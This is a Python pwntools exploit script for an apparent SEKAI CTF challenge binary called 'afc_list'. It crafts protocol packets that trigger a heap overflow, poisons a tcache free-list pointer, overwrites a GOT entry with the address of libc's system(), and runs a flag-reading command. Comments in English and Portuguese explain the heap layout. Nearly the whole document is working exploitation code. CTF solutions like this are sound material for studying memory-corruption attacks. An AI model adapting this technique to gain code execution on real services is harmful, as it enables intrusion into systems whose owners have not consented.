#!/usr/bin/env python3

import socket
import struct
import subprocess
import time
from pwn import *

elf = ELF("./afc_list")
libc = ELF("./libc.so.6")
context.terminal = "tmux splitw -h".split()

def conn():
    if not args.REMOTE:
        subprocess.Popen(["socat", "TCP-LISTEN:5000,reuseaddr,fork", "EXEC:setarch x86_64 -R /chall/afc_list"])
        time.sleep(0.5)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if args.REMOTE:
        s.connect(("addr", 1337))
    else:
        s.connect(("127.0.0.1", 5000))

    if args.GDB:
        s.settimeout(None)

        time.sleep(0.5)
        pid = subprocess.check_output("pgrep -n afc_list", shell=True).decode().strip()
        gdb.attach(int(pid), exe=elf.path, gdbscript="""
            b main
            b afc_receive_data
            b malloc
        """)
        time.sleep(1)

    return s

def recvn(sock, size):
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise EOFError("leu menos do que esperava")
        data += chunk

    return data

def recv_until(sock, delim, timeout=10):
    if not args.GDB:
        sock.settimeout(timeout)

    data = b""

    while delim not in data:
        chunk = sock.recv(1)
        if not chunk:
            break

        data += chunk

    return data

AFC_MAGIC = b"CFA6LPAA"
AFC_OP_DATA = 2
SYSTEM_OFFSET = 0x52290
AFC_FILE_WRITE_GOT = 0x4040a0
libc_base = 0x7ffff7d61000

def pkt(entire_len, this_len, packet_num, payload):
    return struct.pack("<8sQQQQ",
                         AFC_MAGIC,
                         40 + entire_len,
                         40 + this_len,
                         packet_num,
                         AFC_OP_DATA) + payload
    
def parse_recv(sock):
    buffer = b""
    while AFC_MAGIC not in buffer:
        chunk = sock.recv(1)
        if not chunk:
            raise EOFError("conexao encerrada antes do header")

        buffer += chunk

    before, rest = buffer.split(AFC_MAGIC, 1)
    header = AFC_MAGIC + rest + recvn(sock, (40 - len(AFC_MAGIC) - len(rest)))
    
    _, _, this_len, pnum, op = struct.unpack("<8sQQQQ", header)

    body = recvn(sock, this_len - 40) if this_len > 40 else b""

    return before, pnum, op, body


def send(sock, line, payload, entire_len, this_len):
    sock.sendall(line + b"\n")
    b, packet_num, op, body = parse_recv(sock)
    sock.sendall(pkt(entire_len, this_len, packet_num, payload))

def build_payload(system_addr, command):
    # tcache:
    #   0x20 bin: chunk 2 [list] -> chunk 3 [strdup("A")]
    #   0x30 bin: chunk 1 [strdup("BBB...")]
    #   0x110 bin: chunk 0 [data]
    p1 = b"A\x00"
    p1 += b"B"*31 + b"\x00"
    p1 = p1.ljust(0x100, b"C")

    # it does malloc(entire_len=0x100) which will return the 0x110 chunk on
    # tcache, and then afc_receive_data reads this_len=0x110 into it, leading
    # to an overflow into the 0x20 freed chunk and overwriting its fd ptr
    p2 = b"D"*0x110 + struct.pack("<Q", AFC_FILE_WRITE_GOT)

    p3 = command + b" # " + b"E"*32 + b"\x00"
    p3 += b"X"*8 + struct.pack("<Q", system_addr)[:6] + b"\x00" 

    return p1, p2, p3

def main():
    s = conn()

    # pwn it
    system_addr = libc_base + SYSTEM_OFFSET
    pause()

    p1, p2, p3 = build_payload(system_addr, b"/readflag sekai ppp")
    
    banner = recv_until(s, b"afc> ")

    send(s,
        b"ls /",
         p1,
         len(p1),
         len(p1)
    )
    pause()
    stg1 = recv_until(s, b"afc> ")

    send(s,
        b"mkdir /x",
         p2,
         0x100,
         len(p2)
    )
    pause()
    stg2 = recv_until(s, b"afc> ")

    send(s,
        b"ls /",
         p3,
         len(p3),
         len(p3)
    )
    pause()

    time.sleep(0.2)

    output = b""

    if not args.GDB:
        s.settimeout(2)

    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            output += chunk

            if b"SEKAI{" in output:
                break
    except (TimeoutError, socket.timeout):
        pass

    print(banner + stg1 + stg2 + output)
    
if __name__ == '__main__':
    main()

